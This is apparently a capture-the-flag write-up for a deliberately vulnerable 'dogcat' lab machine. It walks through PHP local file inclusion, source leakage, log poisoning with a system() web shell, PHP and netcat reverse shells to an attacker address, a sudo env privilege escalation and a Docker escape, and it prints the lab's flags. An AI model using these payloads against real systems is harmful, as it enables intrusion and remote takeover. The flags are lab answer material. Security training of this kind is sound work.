
> Author: jak010  
> Date: 2021.05.03

## Key Point
- Null Byte Injected
- php filter injection
- Source file leak
- URL Encode
- Docker Container Escaping

## Nmap Scan
```text
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 13:35 KST
NSE: Warning: Could not load 'docker-version.nse': no path to file/directory: docker-version.nse
Nmap scan report for 10.10.87.192
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.76 seconds
```

## Local File Inclusing
- Evaluated Null Byte
   ```text
   http://10.10.87.192/?view=dog%00
   ```
   - Result
       ```text
       Warning: include(): Failed opening 'dog' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
       ```
- PHP filter (PayloadAllTheThing)
    ```text
    http://10.10.87.192/?view=php://filter/convert.base64-encode/resource=dog
    ```
    - Result
        ```text
        Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K
        ```
    - Base64 Decode
        ```text
        Here you go!<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />
        ```

## Source File Leak
- Payload
    ```text
    http://10.10.87.192/?view=php://filter/convert.base64-encode/resource=dog/../index
    ```
     - Source
      ```php
 	   <?php
	   function containsStr($str, $substr)
	    {
	        return strpos($str, $substr) !== false;
	    }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
	    if (isset($_GET['view']))
	    {
	        if (containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat'))
	        {
	            echo 'Here you go!';
	            include $_GET['view'] . $ext;
	        }
	        else
	        {
	            echo 'Sorry, only dogs or cats are allowed.';
	        }
	    }
	   ?>
      ```
       - $ext 변수에서 isset을 통해 변수가 셋팅되어있는지 확인한다. 요청을 보낼 때 ext 변수를 포함해서 보내면 통과
       ```sh 
       http://10.10.87.192/?view=dog/../../../../../../../etc/passwd&ext=
       ```

## User-Agent Injeciton
- Log file Check
    ```sh
    curl -XGET http://10.10.87.192/?view=dog/../../../../../var/log/apache2/access.log&ext=
    ```
    - User-Agent를 로그 파일에서 그대로 보여주고 있으므로 User-Agent 헤더의 값을 변경하여 테스트
    ```sh
    curl -H "User-Agent: hello" -XGET http://10.10.87.192/?view=dog/../../../../../var/log/apache2/access.log&ext=
    ```
    - User-Agent에 입력되는 값을 통해 시스템 명령어를 실행시킬 수 있게 값 시도 (Burp Suie)  
    ```text
    GET /?view=dog/../../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/1.1
	Host: 10.10.98.185
	Upgrade-Insecure-Requests: 1
	DNT: 1
	User-Agent: <?php system($_GET['cmd']); ?>
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Referer: http://10.10.98.185/?view=dog
	Accept-Encoding: gzip, deflate
	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
	Connection: close
    ```

## Gaining Access
- Payload, PHP Reverse Shell
    ```text
    GET /?view=dog/../../../../../var/log/apache2/access.log&ext=&cmd=php+-r+'$sock%3dfsockopen("10.9.26.67",9001)%3bexec("/bin/bash+-i+<%263+>%263+2>%263")%3b' HTTP/1.1
	Host: 10.10.98.185
	Upgrade-Insecure-Requests: 1
	DNT: 1
	User-Agent: <?php system($_GET['cmd']); ?>
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Referer: http://10.10.98.185/?view=dog
	Accept-Encoding: gzip, deflate
	Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
	Connection: close
    ```
    - Reverse Shell을 그대로 보내면 실행이 안됨, URL Encode로 한번 변환시킨 뒤 보내줄 것 (Ctrl + u)

## Flag By User
- 1st flag
    ```sh
    cd /var/www/html
    cat flg.php
    ```
    - VEhNe1RoMXNfMXNfTjB0XzRfQ2F0ZG9nX2FiNjdlZGZhfQo=
- 2st Flag
   ```sh
   /var/www/flag2_QMW7JvaY2LvK.txt
   ```
    - VEhNe0xGMV90MF9SQzNfYWVjM2ZifQo=

## Privilige Escalate
- `sudo -l`
    ```sh
    Matching Defaults entries for www-data on e8ddea23cf2d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

	User www-data may run the following commands on e8ddea23cf2d:
    	(root) NOPASSWD: /usr/bin/env
    ```
    - `sudo /usr/bin/env /bin/sh`

## Flag by Root
- 3st Flag: `VEhNe0QxZmYzcjNudF8zbnYxcm9ubWVudHNfODc0MTEyfQo=`

## Escaping Docker Enviorment
- `.dockerenv Path`
    ```sh
    cd /
	ls -al
	...
	-rwxr-xr-x   1 root root    0 May  3 05:37 .dockerenv
	drwxr-xr-x   1 root root 4096 Feb 26  2020 bin
	...
    ```
- `Malicious command `
    ```sh
    cd /opt
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.26.67 9002 >/tmp/f" >> backup.sh
    ```
    - 4th Flag: `VEhNe2VzYzRsNHRpb25zX29uX2VzYzRsNHRpb25zX29uX2VzYzRsNHRpb25zXzdhNTJiMTdk
YmE2ZWJiMGRjMzhiYzEwNDliY2JhMDJkfQo=`

